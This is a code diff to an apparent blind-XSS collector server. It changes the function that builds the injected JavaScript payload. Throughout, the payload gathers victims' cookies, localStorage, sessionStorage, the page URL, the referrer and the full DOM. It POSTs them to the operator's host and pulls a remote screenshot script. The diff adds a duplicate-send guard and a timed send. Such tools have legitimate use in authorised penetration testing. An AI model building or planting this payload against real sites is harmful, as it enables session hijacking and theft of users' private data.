@@ -125,9 +125,10 @@ app.use(express.urlencoded({ extended: false }));
 // --- Collector script ---
 function buildCollectorScript(hook, baseUrl) {
   return `(function(){
-var d={};
+try{if(window.frameElement&&/html2canvas/.test(window.frameElement.className))return;}catch(e){}
+var d={},sent=false;
 function s(v){return void 0!==v?v:"";}
-function send(){try{var x=new XMLHttpRequest();x.open("POST","${baseUrl}/c/${hook}",true);x.setRequestHeader("Content-type","text/plain");x.send(JSON.stringify(d));}catch(e){}}
+function send(){if(sent)return;sent=true;try{var x=new XMLHttpRequest();x.open("POST","${baseUrl}/c/${hook}",true);x.setRequestHeader("Content-type","text/plain");x.send(JSON.stringify(d));}catch(e){}}
 try{d.uri=s(location.toString());}catch(e){d.uri="";}
 try{d.cookies=s(document.cookie);}catch(e){d.cookies="";}
 try{d.referrer=s(document.referrer);}catch(e){d.referrer="";}
@@ -139,6 +140,7 @@ try{d.localstorage=JSON.stringify(window.localStorage);}catch(e){d.localstorage=
 try{d.sessionstorage=JSON.stringify(window.sessionStorage);}catch(e){d.sessionstorage="";}
 try{d.dom=s(document.documentElement.outerHTML);}catch(e){d.dom="";}
 d.screenshot="";
+setTimeout(send,3000);
 try{
   var h=document.createElement("script");
   h.src="${baseUrl}/h2c.js";
